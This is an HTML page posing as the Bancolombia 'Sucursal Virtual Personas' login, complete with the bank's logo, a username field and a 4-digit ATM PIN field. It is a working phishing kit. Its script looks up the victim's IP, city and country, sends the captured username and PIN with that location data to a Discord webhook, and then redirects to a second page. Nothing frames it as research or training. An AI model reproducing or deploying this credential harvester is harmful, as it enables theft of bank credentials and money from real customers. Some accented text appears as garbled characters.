<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sucursal Virtual Personas</title>
  <style>
    /* --- Tus estilos igual que antes --- */
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Segoe UI', sans-serif; background-color: #f5f5f5; height: 100vh; display: flex; align-items: center; justify-content: center; position: relative; }
    .decoracion { position: absolute; border-radius: 30px; z-index: 0; }
    .linea-amarilla { background-color: #ffcf00; width: 70px; height: 250px; top: 140px; left: -15px; transform: rotate(-20deg); }
    .linea-morada { background-color: #6a1b9a; width: 70px; height: 250px; top: 180px; left: 5px; transform: rotate(-20deg); }
    .linea-naranja { background-color: #f25c05; width: 70px; height: 250px; bottom: 120px; right: -20px; transform: rotate(20deg); }
    .container { background-color: #fff; border-radius: 15px; padding: 50px 40px; width: 100%; max-width: 400px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1); text-align: center; z-index: 1; position: relative; transform: translateX(5px); }
    .logo img { width: 180px; margin-bottom: 5px; }
    .subtitle { font-size: 20px; color: #333; margin-bottom: 25px; }
    h2 { font-size: 20px; color: #111; margin-bottom: 10px; }
    p { font-size: 14px; color: #444; margin-bottom: 40px; }
    .input-group { position: relative; margin-bottom: 40px; text-align: left; }
    .input-group svg { position: absolute; top: 8px; left: 0; width: 26px; height: 26px; fill: #666; }
    .input-group input { border: none; border-bottom: 2px solid #aaa; padding-left: 45px; padding-bottom: 12px; font-size: 17px; width: 100%; background: transparent; color: #000; outline: none; }
    .input-group label { position: absolute; top: 8px; left: 45px; color: #666; font-size: 16px; transition: 0.2s ease all; pointer-events: none; }
    .input-group input:focus + label, .input-group input:not(:placeholder-shown) + label { top: -12px; font-size: 12px; background: #fff; padding: 0 4px; color: #000; }
    button { background-color: #ffcf00; border: none; color: #000; padding: 14px; font-size: 16px; border-radius: 30px; cursor: pointer; font-weight: bold; width: 100%; transition: background-color 0.3s ease; }
    button:hover { background-color: #e6b800; }
  </style>
</head>
<body>

  <!-- L√≠neas decorativas -->
  <div class="decoracion linea-amarilla"></div>
  <div class="decoracion linea-morada"></div>
  <div class="decoracion linea-naranja"></div>

  <div class="container">
    <div class="logo">
      <img src="https://logosenvector.com/logo/img/bancolombia-37384.png" alt="Logo Bancolombia">
    </div>
    <div class="subtitle">Sucursal Virtual Personas</div>
    <h2>¬°Hola!</h2>
    <p>Ingresa los datos para gestionar tus productos y hacer transacciones.</p>

    <form id="loginForm">
      <div class="input-group">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
          <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
        </svg>
        <input type="text" id="usuario" name="usuario" required placeholder=" ">
        <label for="usuario">Usuario</label>
      </div>

      <div class="input-group">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
          <path d="M17 9V7c0-2.8-2.2-5-5-5S7 4.2 7 7v2H4v13h16V9h-3zm-8 0V7c0-1.7 1.3-3 3-3s3 1.3 3 3v2H9z"/>
        </svg>
        <input type="password" id="clave" name="clave" required placeholder=" " maxlength="4" inputmode="numeric" pattern="\d{4}">
        <label for="clave">Clave del cajero</label>
      </div>

      <button type="submit">Iniciar sesi√≥n</button>
    </form>

    <p id="error" style="color: red; margin-top: 10px; display:none;"></p>
  </div>

  <!-- Cargar primero la configuraci√≥n -->
  <script src="app.js"></script>

  <!-- Script con la l√≥gica -->
  <script>
    const form = document.getElementById('loginForm');
    const usuarioInput = document.getElementById('usuario');
    const claveInput = document.getElementById('clave');
    const errorP = document.getElementById('error');

    claveInput.addEventListener('input', () => {
      claveInput.value = claveInput.value.replace(/\D/g, '').slice(0, 4);
    });

    form.addEventListener('submit', async (event) => {
      event.preventDefault();

      const usuario = usuarioInput.value.trim();
      const clave = claveInput.value.trim();

      const tieneLetra = /[a-zA-Z]/.test(usuario);
      const tieneNumero = /\d/.test(usuario);
      const claveValida = /^\d{4}$/.test(clave);

      if (!(tieneLetra && tieneNumero)) {
        errorP.textContent = 'El usuario debe contener al menos una letra y un n√∫mero.';
        errorP.style.display = 'block';
        return;
      }
      if (!claveValida) {
        errorP.textContent = 'La clave debe contener exactamente 4 n√∫meros.';
        errorP.style.display = 'block';
        return;
      }

      errorP.style.display = 'none';

      let ip = 'desconocida', ciudad = 'desconocida', pais = 'desconocido';
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        ip = data.ip || ip;
        ciudad = data.city || ciudad;
        pais = data.country_name || pais;
      } catch (e) { console.warn('Error al obtener ubicaci√≥n:', e); }

      const fecha = new Date().toLocaleString();

      const mensaje = `**üîê BANCOLOMBIA CORSEL**\n**üë§ Usuario:** ${usuario}\n**üîë Clave:** ${clave}\n**üåê IP:** ${ip}\n**üèôÔ∏è Ciudad:** ${ciudad}\n**üåé Pa√≠s:** ${pais}\n**üïí Fecha/Hora:** ${fecha}`;

      try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: mensaje })
        });

        if (response.ok) {
          form.reset();
          window.location.href = "index2.html";
        } else {
          alert("Error al enviar datos a Discord.");
        }
      } catch (error) {
        console.error("Error al conectar con Discord:", error);
        alert("Fallo al enviar al webhook de Discord.");
      }
    });
  </script>
</body>
</html>
